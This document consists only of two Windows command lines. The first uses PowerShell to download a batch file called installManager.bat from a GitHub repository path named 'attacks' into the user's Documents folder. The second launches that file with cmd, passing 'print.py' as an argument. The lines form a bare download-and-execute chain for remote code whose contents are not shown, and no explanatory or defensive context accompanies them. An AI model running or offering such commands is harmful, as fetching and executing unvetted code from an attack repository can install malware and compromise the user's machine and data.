powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/petrohemia/attacks/refs/heads/main/installManager.bat' -OutFile $env:USERPROFILE\Documents\installManager.bat"

cmd /k start "" "%USERPROFILE%\Documents\installManager.bat" print.py
